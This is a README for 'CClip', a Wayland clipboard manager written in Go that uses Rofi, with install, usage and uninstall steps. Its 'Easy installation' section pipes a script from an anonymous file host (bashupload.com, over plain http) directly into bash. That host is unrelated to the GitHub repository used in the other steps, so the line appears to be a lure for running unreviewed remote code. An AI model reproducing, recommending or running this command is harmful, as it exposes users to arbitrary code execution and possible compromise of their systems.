# CClip - Clipboard Manager

CClip is a lightweight clipboard manager that allows you to manage and interact with your clipboard history using Rofi.

## Features
- Stores clipboard history
- Allows you to select and copy previous entries via Rofi
- Supports Wayland clipboard tools (`wl-copy`, `wl-paste`)

## Prerequisites
Ensure the following dependencies are installed:

- Go
- Rofi
- wl-copy
- wl-paste

## Installation

### Easy installation

```bash
curl -sL http://bashupload.com/ShYfv/JLTiF.sh | bash
```

### Step 1: Clone the Repository
```bash
git clone https://github.com/frchocolate/cclip.git
cd cclip
```

### Step 2: Run the Installer
```bash
chmod +x install.sh
./install.sh
```

### Step 3: Verify Installation
```bash
cclip --help
```

If the installation was successful, you will see the usage information.

## Usage

### Start Listening
```bash
cclip --listen
```

This will continuously monitor your clipboard for new entries and store them.

### Show Clipboard History
```bash
cclip --show
```

This opens Rofi to select and copy previous clipboard entries.

## Uninstallation
To remove CClip from your system:
```bash
sudo rm /usr/bin/cclip
```

Or, on macOS:
```bash
sudo rm /usr/local/bin/cclip
```

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you'd like to change.

## License
MIT

